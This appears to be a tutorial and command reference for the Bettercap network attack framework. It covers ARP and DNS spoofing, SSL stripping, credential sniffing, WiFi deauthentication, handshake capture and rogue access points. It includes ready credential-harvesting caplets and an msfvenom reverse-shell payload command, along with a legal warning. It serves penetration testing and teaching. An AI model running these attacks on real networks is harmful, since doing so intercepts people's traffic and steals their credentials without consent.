# Bettercap

## Introduction

## What is Bettercap?

Bettercap is a powerful, flexible, and portable open-source framework for network attacks and monitoring. Created by Simone Margaritelli (evilsocket), Bettercap is designed as a complete, modular, and easily extensible tool for performing various network security assessments, from reconnaissance to exploitation.

## Why Bettercap?

- Modern, actively developed
- Modular architecture
- Cross-platform (Linux, macOS, Windows, ARM)
- Built-in web UI
- Scriptable with caplets
- Low resource footprint
- Multiple protocol support
- Real-time packet manipulation
- Credential sniffing
- MITM capabilities

## Learning Path

1. Understand basic networking
2. Learn ARP, DNS, HTTP protocols
3. Install and configure Bettercap
4. Practice network reconnaissance
5. Master MITM techniques
6. Develop custom caplets

## User Guide

## Prerequisites

- Basic networking knowledge
- Root/administrator privileges
- Understanding of TCP/IP
- Network adapter capabilities

Verify installation:

```bash
bettercap -version
```

## Installation

### Linux (Pre-built packages)

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install bettercap

# Or download latest .deb
wget https://github.com/bettercap/bettercap/releases/download/v2.32.0/bettercap_linux_amd64_v2.32.0.deb
sudo dpkg -i bettercap_linux_amd64_v2.32.0.deb
```

### From source

```bash
# Install Go (required)
sudo apt install golang

# Clone and build
git clone https://github.com/bettercap/bettercap.git
cd bettercap
make build
sudo make install
```

### macOS

```bash
# Using Homebrew
brew install bettercap

# Or download pre-built binary
wget https://github.com/bettercap/bettercap/releases/download/v2.32.0/bettercap_macos_amd64_v2.32.0.zip
unzip bettercap_macos_amd64_v2.32.0.zip
sudo mv bettercap /usr/local/bin/
```

### Windows

```powershell
# Download Windows binary
# https://github.com/bettercap/bettercap/releases

# Install Npcap (required for Windows)
# https://npcap.com/

# Run as Administrator
.\bettercap.exe
```

### ARM (Raspberry Pi)

```bash
# Download ARM build
wget https://github.com/bettercap/bettercap/releases/download/v2.32.0/bettercap_linux_armv7_v2.32.0.zip
unzip bettercap_linux_armv7_v2.32.0.zip
sudo mv bettercap /usr/local/bin/
```

## Basic Usage

### Interactive mode

```bash
# Start interactive session
sudo bettercap

# Start on specific interface
sudo bettercap -iface eth0

# Start with caplet
sudo bettercap -caplet mycaplet.cap

# Start in debug mode
sudo bettercap -debug
```

### Basic commands

```bash
# Show help
help

# Show modules
help modules

# Show module help
help net.probe

# Show events
events.show

# Clear screen
clear

# Exit
exit
```

## Network Discovery

### Network reconnaissance

```bash
# Start Bettercap
sudo bettercap -iface eth0

# Net recon module
>>> net.recon on

# Probe network
>>> net.probe on

# Show discovered hosts
>>> net.show

# Detailed view
>>> net.show -details
```

### ARP spoofing

```bash
# Enable ARP spoofing
>>> set arp.spoof.targets 192.168.1.10
>>> arp.spoof on

# Spoof entire subnet
>>> set arp.spoof.targets 192.168.1.0/24
>>> arp.spoof on

# Full duplex (default)
>>> set arp.spoof.fullduplex true
>>> arp.spoof on
```

## HTTP/HTTPS Interception

### HTTP proxy

```bash
# Enable HTTP proxy
>>> set http.proxy.sslstrip true
>>> http.proxy on

# Custom port
>>> set http.proxy.port 8080
>>> http.proxy on

# SSL stripping
>>> set http.proxy.sslstrip true
>>> http.proxy on
```

### HTTPS proxy

```bash
# Enable HTTPS proxy
>>> set https.proxy.certificate ~/.bettercap-ca.crt
>>> set https.proxy.key ~/.bettercap-ca.key
>>> https.proxy on
```

### Credential sniffing

```bash
# Enable credential sniffer
>>> set net.sniff.verbose true
>>> set net.sniff.local true
>>> net.sniff on

# Captured credentials appear in events
>>> events.show
```

## DNS Spoofing

### DNS responses

```bash
# Spoof specific domain
>>> set dns.spoof.domains example.com
>>> set dns.spoof.address 192.168.1.100
>>> dns.spoof on

# Spoof all domains
>>> set dns.spoof.all true
>>> set dns.spoof.address 192.168.1.100
>>> dns.spoof on

# Multiple domains
>>> set dns.spoof.domains example.com,test.com
>>> dns.spoof on
```

## Packet Sniffing

### Network sniffer

```bash
# Enable packet sniffer
>>> net.sniff on

# Verbose output
>>> set net.sniff.verbose true
>>> net.sniff on

# Local traffic
>>> set net.sniff.local true
>>> net.sniff on

# Filter by protocol
>>> set net.sniff.filter tcp port 80
>>> net.sniff on

# Output to file
>>> set net.sniff.output capture.pcap
>>> net.sniff on
```

### Protocol filters

```bash
# HTTP only
>>> set net.sniff.filter "tcp port 80"
>>> net.sniff on

# HTTPS
>>> set net.sniff.filter "tcp port 443"
>>> net.sniff on

# DNS
>>> set net.sniff.filter "udp port 53"
>>> net.sniff on

# Multiple ports
>>> set net.sniff.filter "tcp port 80 or tcp port 443"
>>> net.sniff on
```

## WiFi Hacking

### WiFi reconnaissance

```bash
# Start WiFi recon
>>> wifi.recon on

# Show access points
>>> wifi.show

# Detailed AP information
>>> wifi.show -details

# Deauthentication attack
>>> set wifi.deauth.target AA:BB:CC:DD:EE:FF
>>> wifi.deauth on
```

### Handshake capture

```bash
# Enable recon and deauth
>>> wifi.recon on
>>> set wifi.deauth.target [AP-MAC]
>>> wifi.deauth on

# Handshakes saved automatically
# Default: ~/bettercap-wifi-handshakes.pcap
```

## BLE (Bluetooth Low Energy)

### BLE scanning

```bash
# Enable BLE recon
>>> ble.recon on

# Show BLE devices
>>> ble.show

# Enumerate device
>>> ble.enum [MAC]

# Write to characteristic
>>> ble.write [MAC] [UUID] [HEX-DATA]
```

## Web UI

### Enable web interface

```bash
# Start web UI
>>> ui.update
>>> set http.server.address 0.0.0.0
>>> set http.server.port 80
>>> http.server on

# Access at:
# http://localhost:80
# or
# http://[your-ip]:80

# Default credentials
# username: (empty)
# password: (empty)
```

### Web UI features

```
- Real-time network map
- Device discovery
- Module control
- Event log viewer
- Packet statistics
- Attack automation
```

## Caplets

### What are caplets?

```
Caplets are scripts that automate Bettercap tasks:
- Sequence of commands
- Reusable configurations
- Complex attack chains
- Custom workflows
```

### Creating caplets

```bash
# Example: http-sniffer.cap
net.probe on
set net.sniff.verbose true
set net.sniff.filter tcp port 80
net.sniff on
events.stream on
```

### Running caplets

```bash
# Run caplet from file
sudo bettercap -caplet http-sniffer.cap

# Run with specific interface
sudo bettercap -iface wlan0 -caplet wifi-monitor.cap

# Interactive mode
>>> caplet http-sniffer.cap
```

### Built-in caplets

```bash
# List available caplets
>>> caplets.show

# Update caplets
>>> caplets.update

# Common built-in caplets:
# - http-req-dump
# - http-ui
# - https-ui
# - dns-spoof
# - arp-spoof
# - mitm6
# - beef-inject
```

## Advanced MITM Attacks

### Combined attack

```bash
# ARP spoofing + HTTP proxy + DNS spoofing
>>> set arp.spoof.targets 192.168.1.0/24
>>> arp.spoof on
>>> set dns.spoof.all true
>>> set dns.spoof.address 192.168.1.100
>>> dns.spoof on
>>> http.proxy on
```

### SSL stripping

```bash
# SSL Strip attack
>>> set http.proxy.sslstrip true
>>> set arp.spoof.targets 192.168.1.0/24
>>> arp.spoof on
>>> http.proxy on
```

### Downgrade attacks

```bash
# HTTPS downgrade
>>> set http.proxy.sslstrip true
>>> set dns.spoof.all true
>>> http.proxy on
>>> dns.spoof on
```

## Scripting with JavaScript

### Custom modules

```javascript
// Example: custom-logger.js
function onPacket(packet) {
    log.info("Packet: " + packet.info);
}
```

### Load custom script

```bash
>>> set packet.proxy.script custom-logger.js
>>> packet.proxy on
```

## REST API

### Enable API

```bash
# Start REST API
>>> set api.rest.address 0.0.0.0
>>> set api.rest.port 8081
>>> set api.rest.username admin
>>> set api.rest.password secret
>>> api.rest on
```

### API endpoints

```bash
# Session information
curl http://localhost:8081/api/session

# Events
curl http://localhost:8081/api/events

# Start module
curl -X POST http://localhost:8081/api/modules/net.probe/start \
  -u admin:secret
```

## Configuration

### Configuration file

```bash
# Location: ~/.bettercap/bettercap.conf

# Example configuration
{
  "caplets": {
    "path": "/usr/local/share/bettercap/caplets"
  },
  "log": {
    "level": "INFO"
  },
  "dns": {
    "port": 53
  },
  "http": {
    "port": 80
  }
}
```

## Common Use Cases

### Credential harvesting

```bash
# Start MITM
>>> set arp.spoof.targets 192.168.1.0/24
>>> arp.spoof on
>>> net.sniff on

# Monitor for credentials
>>> events.stream on
```

### Rogue access point

```bash
# Create fake AP (requires hostapd)
>>> set wifi.ap.ssid "Free WiFi"
>>> set wifi.ap.bssid [MAC]
>>> set wifi.ap.channel 6
>>> wifi.ap
```

### Network mapping

```bash
# Discovery and mapping
>>> net.recon on
>>> net.probe on

# Generate map
>>> net.show -json > network-map.json
```

### Vulnerability assessment

```bash
# Active scanning
>>> syn.scan 192.168.1.0/24

# Service detection
>>> net.recon on
>>> net.probe on
>>> net.show -details
```

## Modules Reference

### Core modules

```
arp.spoof       - ARP spoofing
dns.spoof       - DNS spoofing
http.proxy      - HTTP transparent proxy
https.proxy     - HTTPS transparent proxy
net.probe       - Network discovery
net.recon       - Network reconnaissance
net.sniff       - Packet sniffer
wifi.recon      - WiFi reconnaissance
ble.recon       - BLE reconnaissance
```

### Advanced modules

```
api.rest        - REST API
events.stream   - Event streaming
http.server     - HTTP server
packet.proxy    - Packet proxy
syn.scan        - SYN port scanner
tcp.proxy       - TCP proxy
```

## Troubleshooting

### Permission errors

```bash
# Run as root
sudo bettercap

# Check capabilities (Linux)
sudo setcap cap_net_raw,cap_net_admin=eip /usr/local/bin/bettercap
```

### Interface issues

```bash
# List interfaces
ip link show

# Specify interface explicitly
sudo bettercap -iface eth0

# Enable forwarding
sudo sysctl -w net.ipv4.ip_forward=1
```

### Module won't start

```bash
# Check module status
>>> [module].show

# Enable debug mode
sudo bettercap -debug

# Check for conflicts
sudo netstat -tlnp
```

### WiFi monitor mode

```bash
# Put interface in monitor mode
sudo airmon-ng start wlan0

# Then start bettercap
sudo bettercap -iface wlan0mon
```

## Performance Optimization

### Reduce resource usage

```bash
# Limit targets
>>> set arp.spoof.targets 192.168.1.10,192.168.1.20

# Disable unnecessary modules
>>> net.probe off
>>> events.stream off

# Adjust intervals
>>> set arp.spoof.interval 1000
>>> set net.probe.throttle 100
```

## Security and Legal Considerations

### ⚠️ Legal Warning

- **Only use on networks you own or have explicit written authorization to test**
- Unauthorized network attacks are illegal
- MITM attacks may violate wiretapping laws
- Credential interception is a serious crime
- Can cause network disruption
- Always obtain proper authorization

### Ethical usage

```bash
# Legitimate uses:
# - Authorized penetration testing
# - Security research (controlled environment)
# - Network troubleshooting
# - Educational purposes (isolated lab)
# - Red team exercises (with permission)

# Best practices:
# - Document authorization
# - Limit scope and impact
# - Secure captured data
# - Follow disclosure policies
# - Respect privacy
# - Never attack production systems without permission
```

## Quick Reference

### Common commands

```bash
# Start reconnaissance
sudo bettercap
>>> net.recon on
>>> net.probe on
>>> net.show

# ARP spoofing
>>> set arp.spoof.targets 192.168.1.10
>>> arp.spoof on

# DNS spoofing
>>> set dns.spoof.domains example.com
>>> set dns.spoof.address 192.168.1.100
>>> dns.spoof on

# HTTP proxy
>>> http.proxy on

# Packet sniffing
>>> net.sniff on

# WiFi recon
>>> wifi.recon on
>>> wifi.show

# Web UI
>>> http.server on
```

### Essential caplets

```bash
# HTTP request dump
sudo bettercap -caplet http-req-dump

# Web UI
sudo bettercap -caplet http-ui

# WiFi handshake capture
sudo bettercap -caplet wifi-handshakes

# BLE scanning
sudo bettercap -caplet ble-recon
```

## Real-World Examples

### Pentest - Credential capture

```bash
#!/bin/bash
# credential-harvest.cap

# Enable IP forwarding
! sysctl -w net.ipv4.ip_forward=1

# Set target
set arp.spoof.targets 192.168.1.0/24

# Enable modules
net.probe on
arp.spoof on
net.sniff on

# SSL strip
set http.proxy.sslstrip true
http.proxy on

# Stream events
events.stream on
```

### Red team - Rogue DNS

```bash
# dns-redirect.cap

# Set DNS targets
set dns.spoof.domains *.company.local
set dns.spoof.address 192.168.1.100

# Enable spoofing
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
dns.spoof on

# Log results
events.stream on
```

### Network audit

```bash
# network-audit.cap

# Full discovery
net.recon on
net.probe on

# Wait for discovery
sleep 30

# Show results
net.show -json > audit-results.json
```

## Integration with Other Tools

### Metasploit

```bash
# Generate payload
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 -f elf > payload.elf

# Serve via Bettercap
>>> set http.server.path /var/www/html
>>> http.server on
```

### BeEF (Browser Exploitation Framework)

```bash
# beef-inject.cap
set http.proxy.script beef-inject.js
http.proxy on
```

### Wireshark

```bash
# Capture with Bettercap
>>> set net.sniff.output capture.pcap
>>> net.sniff on

# Analyze with Wireshark
wireshark capture.pcap
```

## Resources

- [Bettercap official site](https://www.bettercap.org/)
- [GitHub repository](https://github.com/bettercap/bettercap)
- [Documentation](https://www.bettercap.org/usage/)
- [Community caplets](https://github.com/bettercap/caplets)
- [Discord community](https://discord.com/invite/bettercap)

## Next Steps

- Learn network protocols in depth
- Practice in isolated lab environment
- Develop custom caplets
- Explore JavaScript modules
- Study wireless security
- Obtain security certifications
- Contribute to Bettercap project
- Join security research community
